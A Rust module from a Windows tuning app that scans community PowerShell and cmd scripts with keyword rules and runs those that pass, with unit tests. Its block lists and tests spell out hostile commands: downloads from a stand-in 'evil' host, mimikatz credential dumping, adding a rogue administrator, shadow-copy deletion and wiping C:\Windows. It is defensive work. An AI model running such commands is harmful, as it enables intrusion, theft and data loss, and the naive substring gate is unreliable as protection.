// ========================================================
// 1boost Smart Script Safety Engine
// Static analysis for .ps1 / .cmd community scripts.
// Scans for dangerous operations before local execution
// or public publishing. Rust-native, zero external deps.
// ========================================================

use serde::{Deserialize, Serialize};
use std::os::windows::process::CommandExt;
use std::process::Command;

const CREATE_NO_WINDOW: u32 = 0x08000000;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScriptSafetyReport {
    pub score: u32,
    pub rating: String, // "verified_safe" | "needs_review" | "dangerous_blocked"
    pub risk_flags: Vec<String>,
    pub touches_registry: bool,
    pub touches_files: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecuteScriptResult {
    pub report: ScriptSafetyReport,
    pub output: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HardwareInfo {
    pub cpu_model: String,
    pub gpu_model: String,
    pub hardware_hash: String,
}

// --------------------------------------------------------
// Text matching helpers
// --------------------------------------------------------

fn is_word_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.'
}

/// Word-boundary aware substring search (prevents "curl" matching "curly").
fn contains_word(haystack: &str, needle: &str) -> bool {
    let bytes = haystack.as_bytes();
    let needle_bytes = needle.as_bytes();
    let n = needle_bytes.len();
    if n == 0 || bytes.len() < n {
        return false;
    }
    let mut i = 0;
    while let Some(pos) = find_subslice(&bytes[i..], needle_bytes) {
        let start = i + pos;
        let end = start + n;
        let before_ok = start == 0 || !is_word_char(bytes[start - 1] as char);
        let after_ok = end >= bytes.len() || !is_word_char(bytes[end] as char);
        if before_ok && after_ok {
            return true;
        }
        i = start + 1;
    }
    false
}

fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

/// Plain substring search (for distinctive multi-word phrases).
fn contains_phrase(haystack: &str, phrase: &str) -> bool {
    haystack.contains(phrase)
}

// --------------------------------------------------------
// Detection rules
// --------------------------------------------------------

/// Critical threat patterns -> automatic rejection (score = 0).
/// Returns the human-readable flag when matched.
fn detect_critical(content: &str) -> Vec<String> {
    let mut flags = Vec::new();

    // 1. Base64 / Obfuscated execution
    if contains_phrase(content, "encodedcommand")
        || contains_phrase(content, "frombase64string")
        || contains_phrase(content, "powershell -e ")
        || contains_phrase(content, "pwsh -e ")
        || contains_phrase(content, "powershell -enc ")
        || contains_phrase(content, "pwsh -enc ")
        || contains_phrase(content, "-encodedcommand")
    {
        flags.push("Base64 / obfuscated command execution detected (EncodedCommand, FromBase64String, -enc / -e)".to_string());
    }

    // 2. Remote payload downloads
    if contains_word(content, "invoke-webrequest")
        || contains_word(content, "invoke-restmethod")
        || contains_word(content, "curl")
        || contains_word(content, "wget")
        || contains_phrase(content, "net.webclient")
        || contains_phrase(content, "start-bitstransfer")
        || contains_phrase(content, "urlcache")
        || contains_word(content, "iwr")
        || contains_word(content, "irm")
        || contains_phrase(content, "downloadstring")
        || contains_phrase(content, "downloadfile")
    {
        flags.push("Remote payload download / network execution detected (Invoke-WebRequest, curl, wget, WebClient, BITS, certutil)".to_string());
    }

    // 3. System destruction / formatting
    if contains_phrase(content, "format-volume")
        || contains_phrase(content, "rmdir /s /q c:")
        || contains_phrase(content, "rmdir /s c:")
        || contains_phrase(content, "remove-item c:\\windows")
        || contains_phrase(content, "remove-item -path c:\\windows")
        || contains_phrase(content, "del /f /q c:\\windows")
        || contains_phrase(content, "vssadmin delete shadows")
        || contains_phrase(content, "diskpart")
        || contains_phrase(content, "format c:")
    {
        flags.push("System destruction / formatting operation detected (Format-Volume, rmdir /s, Remove-Item C:\\Windows, vssadmin, diskpart)".to_string());
    }

    // 4. Credential harvesting / privilege escalation
    if contains_phrase(content, "net user ")
        || contains_phrase(content, "net localgroup")
        || contains_phrase(content, "localgroup administrators")
        || contains_phrase(content, "lsass")
        || contains_phrase(content, "mimikatz")
        || contains_phrase(content, "sekurlsa")
        || contains_phrase(content, "procdump")
        || contains_phrase(content, "seclogon")
    {
        flags.push("Credential harvesting / privilege escalation attempt detected (net user, localgroup, LSASS dump)".to_string());
    }

    // 5. Defender disabling (Set-MpPreference -DisableRealtimeMonitoring $true)
    if contains_phrase(content, "set-mppreference") && contains_phrase(content, "disablerealtimemonitoring") {
        flags.push("Windows Defender real-time monitoring disable detected (Set-MpPreference -DisableRealtimeMonitoring)".to_string());
    }

    flags
}

/// Moderate risk warnings -> require explicit UX confirmation.
fn detect_moderate(content: &str) -> Vec<String> {
    let mut flags = Vec::new();

    // Boot parameters
    if contains_word(content, "bcdedit") {
        flags.push("Modifies Windows boot configuration (bcdedit)".to_string());
    }

    // Network adapter deletion / firewall resets
    if contains_phrase(content, "netsh advfirewall reset") || contains_phrase(content, "netsh firewall reset") {
        flags.push("Resets Windows Firewall to default rules (netsh advfirewall reset)".to_string());
    }
    if contains_phrase(content, "netsh interface delete") || contains_phrase(content, "netsh int ip reset") {
        flags.push("Deletes or resets network adapters / TCP/IP stack (netsh interface delete)".to_string());
    }

    // Active service modifications outside standard telemetry targets
    let mut touches_services = false;
    if contains_phrase(content, "set-service")
        || contains_phrase(content, "sc config")
        || contains_phrase(content, "sc stop")
        || contains_phrase(content, "sc start")
        || contains_phrase(content, "net stop ")
        || contains_phrase(content, "net start ")
        || contains_phrase(content, "restart-service")
        || contains_phrase(content, "stop-service")
        || contains_phrase(content, "start-service")
    {
        touches_services = true;
    }
    let targets_telemetry = contains_phrase(content, "diagtrack") || contains_phrase(content, "dmwappushservice");
    if touches_services && !targets_telemetry {
        flags.push("Modifies Windows services outside standard telemetry targets".to_string());
    }

    flags
}

fn detect_registry_touches(content: &str) -> bool {
    const REGISTRY_MARKERS: &[&str] = &[
        "set-itemproperty",
        "new-itemproperty",
        "remove-itemproperty",
        "reg add",
        "reg delete",
        "reg copy",
        "hkcu",
        "hklm",
        "hkcr",
        "hkcu\\",
        "hklm\\",
        "registry::",
        "currentversion",
        "microsoft\\windows",
    ];
    REGISTRY_MARKERS
        .iter()
        .any(|m| content.contains(&m.to_lowercase()))
}

fn detect_file_touches(content: &str) -> bool {
    const FILE_MARKERS: &[&str] = &[
        "remove-item",
        "new-item ",
        "copy-item",
        "move-item",
        "set-content",
        "add-content",
        "out-file",
        "write-output",
        ">> ",
        "> ",
        "del /",
        "del ",
        "rmdir",
        "copy ",
        "move ",
        "ren ",
        "format ",
        "c:\\",
        "%temp%",
        "%appdata%",
        "%userprofile%",
        "$env:temp",
        "$env:appdata",
        "$env:userprofile",
        "[system.io.file]",
        "[io.file]",
        "fsutil",
        "takeown",
        "icacls",
    ];
    FILE_MARKERS
        .iter()
        .any(|m| content.contains(&m.to_lowercase()))
}

// --------------------------------------------------------
// Core analysis
// --------------------------------------------------------

fn analyze_script_safety_inner(script_content: &str) -> ScriptSafetyReport {
    let content = script_content.to_lowercase();

    let critical_flags = detect_critical(&content);
    let moderate_flags = detect_moderate(&content);

    let mut risk_flags: Vec<String> = Vec::new();
    risk_flags.extend(critical_flags.iter().cloned());
    risk_flags.extend(moderate_flags.iter().cloned());

    let touches_registry = detect_registry_touches(&content);
    let touches_files = detect_file_touches(&content);

    let score: u32;
    let rating: String;

    if !critical_flags.is_empty() {
        score = 0;
        rating = "dangerous_blocked".to_string();
    } else {
        let mut computed = 100i32;
        for _ in &moderate_flags {
            computed -= 15;
        }
        // Moderate-only warnings must never cross into "verified safe"
        if !moderate_flags.is_empty() {
            computed = computed.min(89);
        }
        score = computed.max(0) as u32;
        rating = if score >= 90 {
            "verified_safe".to_string()
        } else if score >= 60 {
            "needs_review".to_string()
        } else {
            "dangerous_blocked".to_string()
        };
    }

    ScriptSafetyReport {
        score,
        rating,
        risk_flags,
        touches_registry,
        touches_files,
    }
}

fn run_powershell_script(script: &str) -> Result<String, String> {
    let mut cmd = Command::new("powershell.exe");
    cmd.creation_flags(CREATE_NO_WINDOW);
    cmd.args(["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script]);

    match cmd.output() {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            if output.status.success() {
                Ok(stdout.trim().to_string())
            } else {
                Err(if !stderr.trim().is_empty() {
                    stderr.trim().to_string()
                } else {
                    format!("Command exited with code {}", output.status)
                })
            }
        }
        Err(e) => Err(format!("Failed to execute PowerShell: {}", e)),
    }
}

fn run_cmd_script(script: &str) -> Result<String, String> {
    let mut cmd = Command::new("cmd.exe");
    cmd.creation_flags(CREATE_NO_WINDOW);
    cmd.args(["/C", script]);

    match cmd.output() {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            if output.status.success() {
                Ok(stdout.trim().to_string())
            } else {
                Err(if !stderr.trim().is_empty() {
                    stderr.trim().to_string()
                } else {
                    format!("Command exited with code {}", output.status)
                })
            }
        }
        Err(e) => Err(format!("Failed to execute cmd script: {}", e)),
    }
}

fn fnv1a_hash(input: &str) -> String {
    let mut hash: u64 = 0xcbf29ce484222325;
    for byte in input.as_bytes() {
        hash ^= *byte as u64;
        hash = hash.wrapping_mul(0x100000001b3);
    }
    format!("{:016x}", hash)
}

// --------------------------------------------------------
// Tauri commands
// --------------------------------------------------------

/// Static analysis of submitted script code. Used by the
/// Publish flow (real-time) and the execution gate.
#[tauri::command]
pub fn analyze_script_safety(script_content: String, _script_type: String) -> ScriptSafetyReport {
    analyze_script_safety_inner(&script_content)
}

/// Gated local execution: refuses scripts that contain
/// critical threat violations (score 0) before running.
#[tauri::command]
pub fn execute_custom_script(script_content: String, script_type: String) -> Result<ExecuteScriptResult, String> {
    let report = analyze_script_safety_inner(&script_content);

    if report.score == 0 || report.rating == "dangerous_blocked" {
        return Err(format!(
            "Script blocked by 1boost Safety Engine: {}",
            report.risk_flags.join("; ")
        ));
    }

    let output = if script_type.eq_ignore_ascii_case("cmd") {
        run_cmd_script(&script_content)?
    } else {
        run_powershell_script(&script_content)?
    };

    Ok(ExecuteScriptResult { report, output })
}

/// Local hardware footprint used for hardware-matched
/// discover filtering and crowdsourced toggle analytics.
#[tauri::command]
pub fn get_hardware_info() -> HardwareInfo {
    let cpu_model = run_powershell_script("(Get-CimInstance Win32_Processor).Name")
        .unwrap_or_default();
    let gpu_model = run_powershell_script(
        "(Get-CimInstance Win32_VideoController | Where-Object { $_.Name -and $_.PNPDeviceID -notlike 'ROOT*' } | Select-Object -First 1).Name",
    )
    .unwrap_or_default();

    let hardware_hash = fnv1a_hash(&format!("{}||{}", cpu_model, gpu_model));

    HardwareInfo {
        cpu_model,
        gpu_model,
        hardware_hash,
    }
}

// --------------------------------------------------------
// Unit tests
// --------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn report(code: &str) -> ScriptSafetyReport {
        analyze_script_safety_inner(code)
    }

    #[test]
    fn blocks_encoded_command_execution() {
        let r = report("powershell.exe -EncodedCommand SQBFAFgA");
        assert_eq!(r.score, 0);
        assert_eq!(r.rating, "dangerous_blocked");
        assert!(!r.risk_flags.is_empty());
    }

    #[test]
    fn blocks_base64_convert() {
        let r = report("[System.Convert]::FromBase64String('aGk=')");
        assert_eq!(r.score, 0);
    }

    #[test]
    fn blocks_remote_downloads() {
        for code in [
            "Invoke-WebRequest -Uri http://evil/x.exe -OutFile x.exe",
            "curl -o evil.exe http://evil/x.exe",
            "wget http://evil/x.exe",
            "(New-Object Net.WebClient).DownloadFile('http://evil/x', 'x')",
            "Start-BitsTransfer -Source http://evil/x.exe",
            "certutil -urlcache -split -f http://evil/x.exe x.exe",
        ] {
            let r = report(code);
            assert_eq!(r.score, 0, "should block: {code}");
        }
    }

    #[test]
    fn blocks_system_destruction() {
        for code in [
            "Format-Volume -DriveLetter C",
            "rmdir /s /q C:\\Windows",
            "Remove-Item C:\\Windows\\System32 -Recurse -Force",
            "vssadmin delete shadows /all /quiet",
        ] {
            let r = report(code);
            assert_eq!(r.score, 0, "should block: {code}");
        }
    }

    #[test]
    fn blocks_credential_harvesting() {
        for code in [
            "net user hacker Passw0rd! /add",
            "net localgroup administrators hacker /add",
            "mimikatz.exe \"sekurlsa::logonpasswords\"",
        ] {
            let r = report(code);
            assert_eq!(r.score, 0, "should block: {code}");
        }
    }

    #[test]
    fn blocks_defender_disable() {
        let r = report("Set-MpPreference -DisableRealtimeMonitoring $true");
        assert_eq!(r.score, 0);
    }

    #[test]
    fn flags_moderate_warnings() {
        let r = report("bcdedit /set {current} bootmenupolicy legacy");
        assert!(r.risk_flags.iter().any(|f| f.contains("bcdedit")));
        assert!(r.score > 0 && r.score < 90);
        assert_eq!(r.rating, "needs_review");
    }

    #[test]
    fn flags_firewall_reset() {
        let r = report("netsh advfirewall reset");
        assert!(r.risk_flags.iter().any(|f| f.contains("Firewall")));
    }

    #[test]
    fn allows_legit_optimization_scripts() {
        let r = report(
            "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\GraphicsDrivers' -Name 'HwSchMode' -Value 2 -Type DWord -Force",
        );
        assert_eq!(r.score, 100);
        assert_eq!(r.rating, "verified_safe");
        assert!(r.touches_registry);
    }

    #[test]
    fn telemetry_service_edits_are_not_flagged() {
        let r = report(
            "Stop-Service -Name 'DiagTrack' -ErrorAction SilentlyContinue; Set-Service -Name 'DiagTrack' -StartupType Disabled",
        );
        assert!(!r.risk_flags.iter().any(|f| f.contains("service")));
        assert_eq!(r.rating, "verified_safe");
    }

    #[test]
    fn non_service_edits_are_flagged() {
        let r = report("Set-Service -Name 'WindowsUpdate' -StartupType Disabled");
        assert!(r.risk_flags.iter().any(|f| f.contains("services")));
    }

    #[test]
    fn word_boundary_prevents_false_positives() {
        assert!(!contains_word("The curly dog ran", "curl"));
        assert!(contains_word("run curl -O file", "curl"));
        assert!(!contains_word("iwrath of the machine", "iwr"));
    }

    #[test]
    fn file_and_registry_detection() {
        let r = report("Remove-Item -Path 'C:\\Temp\\junk\\*' -Recurse -Force; reg add 'HKCU\\Software\\X' /v Y /t REG_SZ /d 1 /f");
        assert!(r.touches_files);
        assert!(r.touches_registry);
    }

    #[test]
    fn cmd_script_detection() {
        let r = report("del /f /s /q C:\\Windows\\Temp\\*");
        assert!(r.touches_files);
        assert_eq!(r.rating, "verified_safe");
    }
}
